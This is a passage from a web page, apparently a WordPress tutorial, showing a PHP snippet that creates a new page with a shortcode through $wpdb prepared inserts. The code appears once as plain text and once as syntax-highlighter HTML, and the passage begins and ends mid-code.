		VALUES ( %d, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %d, %d, %s, %d )", 
	    array(
	    	$current_user-&gt;ID, 
	    	date("Y-m-d H:i:s"), 
	    	gmdate("Y-m-d H:i:s"),
	    	'['.$shortcode.']',
	    	$name,
	    	'publish',
	    	'closed',
	    	'open',
	    	$post_name,
	    	date("Y-m-d H:i:s"), 
	    	gmdate("Y-m-d H:i:s"),
	    	0,
	    	0,
	    	'page',
	    	0
	    	) 
	    ) );
	    
	    // get new ID
		$new_id = $wpdb-&gt;insert_id;
		
		// page meta data
		$wpdb-&gt;query( $wpdb-&gt;prepare( "
			INSERT INTO ".$wpdb-&gt;base_prefix."postmeta
			( 	post_id, 
				meta_key,
				meta_value
			)
			VALUES ( %d, %s, %s )", 
		    array(
		    	$new_id, 
		    	'_wp_page_template',
		    	'sidebar-page.php'
		    	) 
		    ) );
	    		
	    // update guid
	    $url = get_bloginfo('url');
    	if ($url[strlen($url)-1] == '/') { $url = substr($url,0,-1); }
    	$url .= '/?p='.$new_id;
		$sql = "UPDATE ".$wpdb-&gt;prefix."posts SET guid = '%s' WHERE ID = %d";
		$wpdb-&gt;query($wpdb-&gt;prepare($sql, $url, $new_id)); 
	    	    
	echo $r;
	exit;	
}</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-53c98e7aa8c8c996702345-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa8c8c996702345-2">2</div><div class="crayon-num" data-line="crayon-53c98e7aa8c8c996702345-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa8c8c996702345-4">4</div><div class="crayon-num" data-line="crayon-53c98e7aa8c8c996702345-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa8c8c996702345-6">6</div><div class="crayon-num" data-line="crayon-53c98e7aa8c8c996702345-7">7</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa8c8c996702345-8">8</div><div class="crayon-num" data-line="crayon-53c98e7aa8c8c996702345-9">9</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa8c8c996702345-10">10</div><div class="crayon-num" data-line="crayon-53c98e7aa8c8c996702345-11">11</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa8c8c996702345-12">12</div><div class="crayon-num" data-line="crayon-53c98e7aa8c8c996702345-13">13</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa8c8c996702345-14">14</div><div class="crayon-num" data-line="crayon-53c98e7aa8c8c996702345-15">15</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa8c8c996702345-16">16</div><div class="crayon-num" data-line="crayon-53c98e7aa8c8c996702345-17">17</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa8c8c996702345-18">18</div><div class="crayon-num" data-line="crayon-53c98e7aa8c8c996702345-19">19</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa8c8c996702345-20">20</div><div class="crayon-num" data-line="crayon-53c98e7aa8c8c996702345-21">21</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa8c8c996702345-22">22</div><div class="crayon-num" data-line="crayon-53c98e7aa8c8c996702345-23">23</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa8c8c996702345-24">24</div><div class="crayon-num" data-line="crayon-53c98e7aa8c8c996702345-25">25</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa8c8c996702345-26">26</div><div class="crayon-num" data-line="crayon-53c98e7aa8c8c996702345-27">27</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa8c8c996702345-28">28</div><div class="crayon-num" data-line="crayon-53c98e7aa8c8c996702345-29">29</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa8c8c996702345-30">30</div><div class="crayon-num" data-line="crayon-53c98e7aa8c8c996702345-31">31</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa8c8c996702345-32">32</div><div class="crayon-num" data-line="crayon-53c98e7aa8c8c996702345-33">33</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa8c8c996702345-34">34</div><div class="crayon-num" data-line="crayon-53c98e7aa8c8c996702345-35">35</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa8c8c996702345-36">36</div><div class="crayon-num" data-line="crayon-53c98e7aa8c8c996702345-37">37</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa8c8c996702345-38">38</div><div class="crayon-num" data-line="crayon-53c98e7aa8c8c996702345-39">39</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa8c8c996702345-40">40</div><div class="crayon-num" data-line="crayon-53c98e7aa8c8c996702345-41">41</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa8c8c996702345-42">42</div><div class="crayon-num" data-line="crayon-53c98e7aa8c8c996702345-43">43</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa8c8c996702345-44">44</div><div class="crayon-num" data-line="crayon-53c98e7aa8c8c996702345-45">45</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa8c8c996702345-46">46</div><div class="crayon-num" data-line="crayon-53c98e7aa8c8c996702345-47">47</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa8c8c996702345-48">48</div><div class="crayon-num" data-line="crayon-53c98e7aa8c8c996702345-49">49</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa8c8c996702345-50">50</div><div class="crayon-num" data-line="crayon-53c98e7aa8c8c996702345-51">51</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa8c8c996702345-52">52</div><div class="crayon-num" data-line="crayon-53c98e7aa8c8c996702345-53">53</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa8c8c996702345-54">54</div><div class="crayon-num" data-line="crayon-53c98e7aa8c8c996702345-55">55</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa8c8c996702345-56">56</div><div class="crayon-num" data-line="crayon-53c98e7aa8c8c996702345-57">57</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa8c8c996702345-58">58</div><div class="crayon-num" data-line="crayon-53c98e7aa8c8c996702345-59">59</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa8c8c996702345-60">60</div><div class="crayon-num" data-line="crayon-53c98e7aa8c8c996702345-61">61</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa8c8c996702345-62">62</div><div class="crayon-num" data-line="crayon-53c98e7aa8c8c996702345-63">63</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa8c8c996702345-64">64</div><div class="crayon-num" data-line="crayon-53c98e7aa8c8c996702345-65">65</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa8c8c996702345-66">66</div><div class="crayon-num" data-line="crayon-53c98e7aa8c8c996702345-67">67</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa8c8c996702345-68">68</div><div class="crayon-num" data-line="crayon-53c98e7aa8c8c996702345-69">69</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa8c8c996702345-70">70</div><div class="crayon-num" data-line="crayon-53c98e7aa8c8c996702345-71">71</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa8c8c996702345-72">72</div><div class="crayon-num" data-line="crayon-53c98e7aa8c8c996702345-73">73</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa8c8c996702345-74">74</div><div class="crayon-num" data-line="crayon-53c98e7aa8c8c996702345-75">75</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa8c8c996702345-76">76</div><div class="crayon-num" data-line="crayon-53c98e7aa8c8c996702345-77">77</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-line" id="crayon-53c98e7aa8c8c996702345-1"><span class="crayon-c">// Add new page</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa8c8c996702345-2"><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-v">action</span><span class="crayon-h"> </span><span class="crayon-o">==</span><span class="crayon-h"> </span><span class="crayon-s">"add_new_page"</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line" id="crayon-53c98e7aa8c8c996702345-3"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa8c8c996702345-4"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-m">global</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-i">wpdb</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-i">current_user</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c98e7aa8c8c996702345-5">&nbsp;</div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa8c8c996702345-6"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">r</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-s">'OK'</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c98e7aa8c8c996702345-7">&nbsp;</div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa8c8c996702345-8"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">shortcode</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-v">_POST</span><span class="crayon-sy">[</span><span class="crayon-s">'shortcode'</span><span class="crayon-sy">]</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c98e7aa8c8c996702345-9"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">name</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-v">_POST</span><span class="crayon-sy">[</span><span class="crayon-s">'name'</span><span class="crayon-sy">]</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa8c8c996702345-10"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">post_name</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-e">str_replace</span><span class="crayon-sy">(</span><span class="crayon-s">' '</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-s">''</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-e">strtolower</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-i">name</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c98e7aa8c8c996702345-11"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa8c8c996702345-12"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-i">wpdb</span><span class="crayon-o">-&gt;</span><span class="crayon-e">query</span><span class="crayon-sy">(</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-i">wpdb</span><span class="crayon-o">-&gt;</span><span class="crayon-e">prepare</span><span class="crayon-sy">(</span><span class="crayon-h"> </span><span class="crayon-s">"</span></div><div class="crayon-line" id="crayon-53c98e7aa8c8c996702345-13"><span class="crayon-s">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;INSERT INTO "</span><span class="crayon-sy">.</span><span class="crayon-sy">$</span><span class="crayon-i">wpdb</span><span class="crayon-o">-&gt;</span><span class="crayon-v">prefix</span><span class="crayon-sy">.</span><span class="crayon-s">"posts</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa8c8c996702345-14"><span class="crayon-s">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;( &nbsp;&nbsp;&nbsp;&nbsp;post_author, </span></div><div class="crayon-line" id="crayon-53c98e7aa8c8c996702345-15"><span class="crayon-s">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;post_date,</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa8c8c996702345-16"><span class="crayon-s">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;post_date_gmt,</span></div><div class="crayon-line" id="crayon-53c98e7aa8c8c996702345-17"><span class="crayon-s">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;post_content,</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa8c8c996702345-18"><span class="crayon-s">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;post_title,</span></div><div class="crayon-line" id="crayon-53c98e7aa8c8c996702345-19"><span class="crayon-s">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;post_status,</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa8c8c996702345-20"><span class="crayon-s">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;comment_status,</span></div><div class="crayon-line" id="crayon-53c98e7aa8c8c996702345-21"><span class="crayon-s">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ping_status,</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa8c8c996702345-22"><span class="crayon-s">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;post_name,</span></div><div class="crayon-line" id="crayon-53c98e7aa8c8c996702345-23"><span class="crayon-s">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;post_modified,</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa8c8c996702345-24"><span class="crayon-s">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;post_modified_gmt,</span></div><div class="crayon-line" id="crayon-53c98e7aa8c8c996702345-25"><span class="crayon-s">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;post_parent,</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa8c8c996702345-26"><span class="crayon-s">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;menu_order,</span></div><div class="crayon-line" id="crayon-53c98e7aa8c8c996702345-27"><span class="crayon-s">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;post_type,</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa8c8c996702345-28"><span class="crayon-s">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;comment_count</span></div><div class="crayon-line" id="crayon-53c98e7aa8c8c996702345-29"><span class="crayon-s">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;)</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa8c8c996702345-30"><span class="crayon-s">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;VALUES ( %d, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %d, %d, %s, %d )"</span><span class="crayon-sy">,</span><span class="crayon-h"> </span></div><div class="crayon-line" id="crayon-53c98e7aa8c8c996702345-31"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-t">array</span><span class="crayon-sy">(</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa8c8c996702345-32"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-i">current_user</span><span class="crayon-o">-&gt;</span><span class="crayon-i">ID</span><span class="crayon-sy">,</span><span class="crayon-h"> </span></div><div class="crayon-line" id="crayon-53c98e7aa8c8c996702345-33"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">date</span><span class="crayon-sy">(</span><span class="crayon-s">"Y-m-d H:i:s"</span><span class="crayon-sy">)</span><span class="crayon-sy">,</span><span class="crayon-h"> </span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa8c8c996702345-34"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">gmdate</span><span class="crayon-sy">(</span><span class="crayon-s">"Y-m-d H:i:s"</span><span class="crayon-sy">)</span><span class="crayon-sy">,</span></div><div class="crayon-line" id="crayon-53c98e7aa8c8c996702345-35"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-s">'['</span><span class="crayon-sy">.</span><span class="crayon-sy">$</span><span class="crayon-v">shortcode</span><span class="crayon-sy">.</span><span class="crayon-s">']'</span><span class="crayon-sy">,</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa8c8c996702345-36"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-i">name</span><span class="crayon-sy">,</span></div><div class="crayon-line" id="crayon-53c98e7aa8c8c996702345-37"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-s">'publish'</span><span class="crayon-sy">,</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa8c8c996702345-38"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-s">'closed'</span><span class="crayon-sy">,</span></div><div class="crayon-line" id="crayon-53c98e7aa8c8c996702345-39"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-s">'open'</span><span class="crayon-sy">,</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa8c8c996702345-40"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-i">post_name</span><span class="crayon-sy">,</span></div><div class="crayon-line" id="crayon-53c98e7aa8c8c996702345-41"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">date</span><span class="crayon-sy">(</span><span class="crayon-s">"Y-m-d H:i:s"</span><span class="crayon-sy">)</span><span class="crayon-sy">,</span><span class="crayon-h"> </span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa8c8c996702345-42"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">gmdate</span><span class="crayon-sy">(</span><span class="crayon-s">"Y-m-d H:i:s"</span><span class="crayon-sy">)</span><span class="crayon-sy">,</span></div><div class="crayon-line" id="crayon-53c98e7aa8c8c996702345-43"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-cn">0</span><span class="crayon-sy">,</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa8c8c996702345-44"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-cn">0</span><span class="crayon-sy">,</span></div><div class="crayon-line" id="crayon-53c98e7aa8c8c996702345-45"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-s">'page'</span><span class="crayon-sy">,</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa8c8c996702345-46"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-cn">0</span></div><div class="crayon-line" id="crayon-53c98e7aa8c8c996702345-47"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">)</span><span class="crayon-h"> </span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa8c8c996702345-48"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c98e7aa8c8c996702345-49"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa8c8c996702345-50"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-c">// get new ID</span></div><div class="crayon-line" id="crayon-53c98e7aa8c8c996702345-51"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">new_id</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-i">wpdb</span><span class="crayon-o">-&gt;</span><span class="crayon-i">insert_id</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa8c8c996702345-52"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span></div><div class="crayon-line" id="crayon-53c98e7aa8c8c996702345-53"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-c">// page meta data</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa8c8c996702345-54"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-i">wpdb</span><span class="crayon-o">-&gt;</span><span class="crayon-e">query</span><span class="crayon-sy">(</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-i">wpdb</span><span class="crayon-o">-&gt;</span><span class="crayon-e">prepare</span><span class="crayon-sy">(</span><span class="crayon-h"> </span><span class="crayon-s">"</span></div><div class="crayon-line" id="crayon-53c98e7aa8c8c996702345-55"><span class="crayon-s">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;INSERT INTO "</span><span class="crayon-sy">.</span><span class="crayon-sy">$</span><span class="crayon-i">wpdb</span><span class="crayon-o">-&gt;</span><span class="crayon-v">base_prefix</span><span class="crayon-sy">.</span><span class="crayon-s">"postmeta</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa8c8c996702345-56"><span class="crayon-s">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;( &nbsp;&nbsp;&nbsp;&nbsp;post_id, </span></div><div class="crayon-line" id="crayon-53c98e7aa8c8c996702345-57"><span class="crayon-s">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;meta_key,</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa8c8c996702345-58"><span class="crayon-s">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;meta_value</span></div><div class="crayon-line" id="crayon-53c98e7aa8c8c996702345-59"><span class="crayon-s">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;)</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa8c8c996702345-60"><span class="crayon-s">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;VALUES ( %d, %s, %s )"</span><span class="crayon-sy">,</span><span class="crayon-h"> </span></div><div class="crayon-line" id="crayon-53c98e7aa8c8c996702345-61"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-t">array</span><span class="crayon-sy">(</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa8c8c996702345-62"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-i">new_id</span><span class="crayon-sy">,</span><span class="crayon-h"> </span></div><div class="crayon-line" id="crayon-53c98e7aa8c8c996702345-63"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-s">'_wp_page_template'</span><span class="crayon-sy">,</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa8c8c996702345-64"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-s">'sidebar-page.php'</span></div><div class="crayon-line" id="crayon-53c98e7aa8c8c996702345-65"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">)</span><span class="crayon-h"> </span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa8c8c996702345-66"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c98e7aa8c8c996702345-67"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa8c8c996702345-68"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-c">// update guid</span></div><div class="crayon-line" id="crayon-53c98e7aa8c8c996702345-69"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">url</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-e">get_bloginfo</span><span class="crayon-sy">(</span><span class="crayon-s">'url'</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" 